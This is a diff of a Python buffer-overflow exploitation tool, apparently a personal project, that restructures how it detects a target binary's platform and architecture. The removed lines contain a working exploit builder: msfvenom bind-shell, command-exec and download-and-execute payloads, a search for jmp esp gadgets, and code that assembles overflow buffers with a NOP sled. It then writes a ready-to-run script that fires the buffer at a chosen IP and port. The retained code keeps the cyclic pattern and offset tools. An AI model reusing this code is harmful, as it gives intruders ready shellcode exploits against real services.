@@ -8,10 +8,34 @@ import time
 import subprocess
 import re
 import struct
+import platform
 
 #region tuning
 PATTERN_SIZE = 5000 #characters
 LOAD_TIME = 5 #seconds
+#endregion
+
+#region lookups
+""""platforms"""
+PLATFORM_WINDOWS = "windows"
+PLATFORM_LINUX = "linux"
+
+"""architecture"""
+ARCH_16_BIT = "16-bit"
+ARCH_32_BIT = "32-bit"
+ARCH_64_BIT = "64-bit"
+
+"""known file type strings for binaries"""
+FILE_TYPE_STRING_ELF16 = "ELF 16-bit"
+FILE_TYPE_STRING_ELF32 = "ELF 32-bit"
+FILE_TYPE_STRING_ELF64 = "ELF 64-bit"
+FILE_TYPE_STRING_PE16 = "PE16"
+FILE_TYPE_STRING_PE32 = "PE32"
+FILE_TYPE_STRING_PE64 = "PE64"
+
+"""application types"""
+APP_TYPE_SERVER = "server"
+APP_TYPE_CLI = "cli"
 #endregion
 
 #region banners
@@ -50,7 +74,7 @@ def print_banner():
     print(banner)
 #endregion
 
-#region ip validation
+#region validation
 """
 copied from: https://stackoverflow.com/a/4017219
 post by danilo bargen and tzot
@@ -185,13 +209,16 @@ def prompt_base(prompt):
     """
     return input(prompt + ": ")
 
-def log_error(error_message):
-    """prints out standard logging sytle error message
+def log_error(error_message, no_exit=False):
+    """prints out standard logging sytle error message and exits
 
     Args:
         error_message (str): error message
+        no_exit (Boolean): exit the system after error message
     """
     log(f"error: ")
+    if not no_exit:
+        exit()
 
 def log(info):
     """prints out standard logging style
@@ -202,40 +229,47 @@ def log(info):
     print(f"[{info}]")
 #endregion
 
-#region targeting
-def get_local_binary_targeting_info():
-    """get information regarding location and type of the binary to be exploited
-
-    Returns:
-        str: the absolute path to the binary
-        str: the operating system the binary is compiled for (linux or windows)
-    """
-    file_location = prompt_base("where is the file located?")
-    file_location = os.path.abspath(file_location)
-
-    file_type = os.popen(f"file {file_location}").read()
-
-    if "ELF 32-bit" in file_type:
-        file_type = "linux"
-    elif "PE32 executable" in file_type:
-        file_type = "windows"
-    elif prompt_yn("is this a linux binary?"):
-        file_type = "linux"
+#region local environment validation
+#todo: add checks for other utilities (ie. grep, netstat)
+def check_architecture(target_architecture):
+    if target_architecture == ARCH_16_BIT:
+        # should be fine
+        pass
+    elif target_architecture == ARCH_32_BIT:
+        # should be fine
+        pass
+    elif target_architecture == ARCH_64_BIT:
+        # needs to be a 64 bit system
+        is_64_bit_system = platform.machine().endswith("64")
+        if not is_64_bit_system:
+            log_error("you are unable to analyze a 64-bit binary on a non-64-bit system")
     else:
-        file_type = "windows"
-    
-    print(f"[{file_type} executable]")
+        log_error(f"something is strange with the architecture type '{target_architecture}'")
 
-    return (file_location, file_type)
+def check_platform(target_platform):
+    if target_platform == PLATFORM_LINUX:
+        pass
+    elif target_platform == PLATFORM_WINDOWS:
+        # requires wine
+        try:
+            subprocess.run(["wine", "--help"], check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        except:
+            log_error("wine needs to be installed")
+    else:
+        log_error(f"something is strange with the platform type '{target_platform}'")
+
+def check_dependencies(target_binary, target_platform, target_architecture, target_type):
+    check_architecture(target_architecture)
+    check_platform(target_platform)
 #endregion
 
 #region toolkit
 """pattern tools from ickerwx/pattern library on github"""
-def pattern_create(length = 8192):
+def get_pattern(length = PATTERN_SIZE):
     """generate a non-repeating pattern to identify memory positions
 
     Args:
-        length (int, optional): how long of a pattern to generate. Defaults to 8192.
+        length (int, optional): how long of a pattern to generate. Defaults to PATTERN_SIZE.
 
     Returns:
         str: a non-repeating pattern
@@ -256,27 +290,27 @@ def pattern_create(length = 8192):
                         parts[0] = 'A'
     return pattern
 
-def pattern_offset(value, pattern = "", length = 8192):
+def get_pattern_offset(value, pattern = "", length = PATTERN_SIZE):
     """calculates size of offset from buffer overflow
 
     Args:
         value (str): value seen in memory register
         pattern (str, optional): the original pattern, so it doesn't have to be recalculated. Defaults to regenerating the pattern.
-        length (int, optional): the length of the pattern to generate for searching. Defaults to 8192.
+        length (int, optional): the length of the pattern to generate for searching. Defaults to PATTERN_SIZE.
 
     Returns:
         int: offset size or -1 if not found in pattern
     """
     try:
         if pattern == "":
-            pattern = pattern_create(length)
+            pattern = get_pattern(length)
         value = struct.pack('<I', int(value, 16))
         value = value.decode()
         return pattern.index(value)
     except:
         return -1
 
-def send_message(address, port, message):
+def send_message_tcp(address, port, message):
     """send a message, via tcp
 
     Args:
@@ -294,210 +328,153 @@ def send_message(address, port, message):
     response = socket_connection.recv(2048)
     socket_connection.close()
     return response
-
-def generate_payload(platform):
-    windows_payloads = ["windows/shell_bind_tcp", "windows/exec", "windows/download_exec"]
-    if platform == "windows":
-        payload_choice = prompt_list("select a payload.", windows_payloads)
-        if payload_choice == "windows/shell_bind_tcp":
-            lport = prompt_number("what port would you like it to listen on?")
-            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/shell_bind_tcp", f"LPORT={lport}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        elif payload_choice == "windows/exec":
-            cmd = prompt_base("what command would you like to be executed?")
-            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/exec", f"CMD={cmd}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        elif payload_choice == "windows/download_exec":
-            url = prompt_base("what is the url for the file you would like executed? (should be an exe)")
-            file_name = prompt_base("what is the name you would like the file to be saved under?")
-            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/download_exec", f"URL={url}", f"EXE={file_name}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        else:
-            print(f"[error selecting payload {payload_choice}]")
-            quit()
-    else: #linux
-        pass
-    print("[generating payload]")
-    raw_payload = msfvenom.stdout.read().decode()
-    payload = bytes.fromhex(raw_payload)
-    return payload
-
-def weaponize_payload(prefix, offset, address_packed, payload):
-    options = ["python script", "payload file"]
-    choice = prompt_list("how would you like to weaponize?", options)
-    filename = prompt_base("how would you like to name the file?")
-    if choice != "payload file":
-        target_ip = prompt_ip("what ip would you like to target?")
-        target_port = prompt_number("what port would you like to target?")
-    full_payload = b""
-    full_payload += prefix.encode()
-    full_payload += b"A" * offset
-    full_payload += address_packed
-    full_payload += b"\x90" * 10
-    full_payload += payload
-    if choice == "python script":
-        file = []
-        file.append('#!/usr/bin/python3\n')
-        file.append("import socket\n")
-        file.append(f'buf = {full_payload}\n')
-        file.append("def send_exploit(address, port, exploit):\n")
-        file.append("    socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
-        file.append("    socket_connection.connect((address, port))\n")
-        file.append("    print(socket_connection.recv(2048))\n")
-        file.append("    socket_connection.send(exploit)\n")
-        file.append("    print(socket_connection.recv(2048))\n")
-        file.append("    socket_connection.close()\n")
-        file.append(f'send_exploit("{target_ip}", {target_port}, buf)')
-        with open(filename, "w") as exploit_file:
-            exploit_file.writelines(file)
-    elif choice == "payload file":
-        with open(filename, "wb") as exploit_file:
-            exploit_file.write(full_payload)
-    else:
-        print("[error, no selection]")
 #endregion
 
-#region windows analysis
-def check_wine_installed():
-    """check if wine is installed, quit if it is not
-    """
-    try:
-        print("[checking that wine is installed]")
-        subprocess.run(["wine", "--help"], check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        print("[wine is installed]")
-    except:
-        print("[windows binaries require wine to be installed, aborting]")
-        quit()
+#region local binary targeting
+def get_target_binary():
+    """get the target binary file from the user
 
-def analyze_windows(local_binary_targeting):
-    """analyze a windows binary
+    Returns:
+        str: local path to the file
+    """
+    file_location = prompt_base("where is the file located?")
+    file_location = os.path.abspath(file_location)
+    return file_location
+
+def get_target_platform(target_binary):
+    """detect or prompt for the platform and architecture a binary is associated with
 
     Args:
-        local_binary_targeting (str, str): absolute path to binary and the type of the binary (should be windows)
+        target_binary (str): path to targeted binary file
+
+    Returns:
+        (str, str): platform, architecture tuple
     """
-    # verify that wine is installed
-    check_wine_installed()
+    file_type_string = os.popen(f"file {target_binary}").read()
+    if FILE_TYPE_STRING_ELF16 in file_type_string:
+        platform = PLATFORM_LINUX
+        architecture = ARCH_16_BIT
+    elif FILE_TYPE_STRING_ELF32 in file_type_string:
+        platform = PLATFORM_LINUX
+        architecture = ARCH_32_BIT
+    elif FILE_TYPE_STRING_ELF64 in file_type_string:
+        platform = PLATFORM_LINUX
+        architecture = ARCH_64_BIT
+    elif FILE_TYPE_STRING_PE16 in file_type_string:
+        platform = PLATFORM_WINDOWS
+        architecture = ARCH_16_BIT
+    elif FILE_TYPE_STRING_PE32 in file_type_string:
+        platform = PLATFORM_WINDOWS
+        architecture = ARCH_32_BIT
+    elif FILE_TYPE_STRING_PE64 in file_type_string:
+        platform = PLATFORM_WINDOWS
+        architecture = ARCH_64_BIT
+    else:
+        log("unable to detect binary type")
+        is_linux_bin = prompt_yn("is this a linux binary?")
+        if is_linux_bin:
+            platform = PLATFORM_LINUX
+        else:
+            platform = PLATFORM_WINDOWS
+        architecture = prompt_list("select the architecture", [ARCH_16_BIT, ARCH_32_BIT, ARCH_64_BIT])
+    log(f"platform is {architecture} {platform}")
+    return (platform, architecture)
 
-    # start the binary
-    print(f"[starting the binary with wine]")
-    wine_instance = subprocess.Popen(["wine", local_binary_targeting[0]], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+def get_target_type():
+    is_cli = prompt_yn("is this a command-line application(not a server)?")
+    if is_cli:
+        return APP_TYPE_CLI
+    else:
+        return APP_TYPE_SERVER
 
-    # give the binary time to load
-    time.sleep(LOAD_TIME)
+def get_target_info():
+    target_binary = get_target_binary()
+    target_platform, target_architecture = get_target_platform(target_binary)
+    target_type = get_target_type()
+    return target_binary, target_platform, target_architecture, target_type
+#endregion
 
-    # pull any ports the binary is listening to
-    # todo: make this do more than one port
-    print(f"[getting port number with netstat]")
-    try:
-        # start netstat and pull output
-        netstat_results = subprocess.check_output(["netstat", "-lnpt"], stderr=subprocess.PIPE).decode("utf-8")
-
-        # filter based on "LISTENING" and pid
-        netstat_results = [line for line in netstat_results.splitlines() if str(wine_instance.pid) in line and "LISTEN" in line]
-        
-        # get the port number (first number following a semicolon)
-        port = int(re.search(r":\d+", netstat_results[0]).group(0).strip(":"))
-
-        print(f"[{local_binary_targeting[0]} is listening on port {port}]")
-    except:
-        # no ports open
+#region local binary analysis
+def analyze_local_server_binary_get_ports(target_binary, target_platform):
+    log("warning: this will run the binary on your local machine, this could put you at risk")
+    detect_ports = prompt_yn("magically detect ports?")
+    if detect_ports:
         port = -1
-        print(f"[{local_binary_targeting[0]} is a console app]")
-        # kill the program, we'll need to pass it arguments
-        wine_instance.terminate()
-
-    # add a prefix to the pattern
-    prefix = prompt_base("is there a prefix for targeting? (leave blank if no)")
-
-    # create the message
-    pattern = pattern_create(length=PATTERN_SIZE)
-    map_message = prefix + pattern
-
-    if port > 0:
-        # send the message via tcp
-        print("[expect to see an error message, just close it]")
-        map_message = str.encode(map_message)
-        send_message("localhost", port, map_message)
-
         try:
-            # catch the error message
-            stderr = wine_instance.stderr.read()
-            error_message = stderr.decode()
+            # start the server
+            log("starting the binary")
+            if target_platform == PLATFORM_WINDOWS:
+                log("using wine")
+                server_instance = subprocess.Popen(["wine", target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            else:
+                log("running binary")
+                server_instance = subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-            # extract the offset pattern
-            offset_pattern = re.search(r"Unhandled page fault on read access to 0x[0-9a-f]{8}", error_message).group(0)
-            offset_pattern = offset_pattern.strip("Unhandled page fault on read access to 0x")
+            # give it time to start up
+            log("allowing time to start")
+            time.sleep(LOAD_TIME)
 
-            # calculate the offset
-            offset = pattern_offset(offset_pattern, pattern=pattern)
+            # grab netstat results
+            netstat_results = subprocess.check_output(["netstat", "-lnpt"], stderr=subprocess.PIPE).decode("utf-8")
+
+            # ignore anything without pid of the server or the "LISTEN" status
+            netstat_results = [line for line in netstat_results.splitlines() if str(server_instance.pid) in line and "LISTEN" in line]
+
+            # extract port numbers
+            ports = [int(re.search(r":\d+", line).group(0).strip(":")) for line in netstat_results]
+            
+            # select port numbers
+            if len(ports) > 1:
+                port = prompt_list("select a port to target", ports)
+            elif len(ports) == 1:
+                port = ports[0]
+            else:
+                log("unable to detect port")
         except:
-            offset = -1
+            log("failed to magically get the port")
+        finally:
+            # clean up
+            log("killing the server")
+            server_instance.kill()
 
-        if offset > 0:
-            print(f"[found offset at {offset}]")
-        else:
-            print("[unable to find offset]")
-            quit()
+    # check if valid port detected
+    if not (1 <= port <= 65535):
+        # prompt the user for a port if not
+        port = prompt_number("target port?")
 
+    log(f"target port {port}")
+    return port
 
-    else:
-        # pass the message in via command line
+def analyze_local_binary(target_binary, target_platform, target_architecture, target_type):
+    # get port (if necessary)
+    target_port = -1 # filler, unused for cli apps
+    if target_type == APP_TYPE_SERVER:
+        target_port = analyze_local_server_binary_get_ports(target_binary, target_platform)
 
-        pass
+    target_prefix = prompt_base("what prefix should be used for interaction? (leave blank for none)")
 
-    # get any additional binaries that may have usable jump instructions
-    additional_binaries = prompt_base("are there any dlls associated with this code? (separate with spaces)")
+    target_offset = 0
+    target_base_address = 0
+    target_instruction_address =0
+
+    return (target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset, target_base_address, target_instruction_address)
     
-    # put them all in a list, adjust to absolute paths
-    all_binaries = [local_binary_targeting[0]]
-    all_binaries.extend([os.path.abspath(binary) for binary in additional_binaries.split(" ")])
-
-    all_targetable_jumps = []
-
-    # locate targetable jumps
-    print("[locating targetable jmps]")
-    for binary in all_binaries:
-        objdump = subprocess.Popen(["objdump", "-D", binary],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        grepjmp = subprocess.Popen(["grep", "jmp"], stdin=objdump.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        grepesp = subprocess.Popen(["grep", "esp"], stdin=grepjmp.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        results = grepesp.stdout.readlines()
-        if results is not None:
-            for line in results:
-                instruction = line.decode().strip()
-                all_targetable_jumps.append(instruction)
-
-    # select a target
-    if len(all_targetable_jumps):
-        selected_target = prompt_list("select a target.", all_targetable_jumps)
-    else: 
-        print("[no jump targets found]")
-        quit()
-
-    # convert address to little endian format
-    address = selected_target[:8]
-    address_packed = struct.pack("<I", int(address, 16))
-
-    print(f"[address selected 0x{address} packed into {address_packed.hex()} ]")
-
-    payload = generate_payload(local_binary_targeting[1])
-
-    weaponize_payload(prefix, offset, address_packed, payload)
 #endregion
 
-#region linux analysis
-def analyze_linux(local_binary_targeting):
-    """analyze a linux binary
+#remote targeting
 
-    Args:
-        local_binary_targeting (str, str): absolute path to binary and the type of the binary (should be linux)
-    """
-    if local_binary_targeting[2] == "console":
-        Exception("not implemented")
-    else:
-        Exception("not implemented")
 #endregion
 
 if __name__ == "__main__":
+    # greet the user
     print_banner()
-    local_binary_targeting = get_local_binary_targeting_info()
-    if local_binary_targeting[1] == "windows":
-        analyze_windows(local_binary_targeting)
-    else:
-        analyze_linux(local_binary_targeting)
+
+    # get targeting info from the user
+    target_info = get_target_info()
+
+    # verify the system is configured for this target binary
+    check_dependencies(*target_info)
+
+    # analyze the binary
+    analysis_results = analyze_local_binary(*target_info)
+    
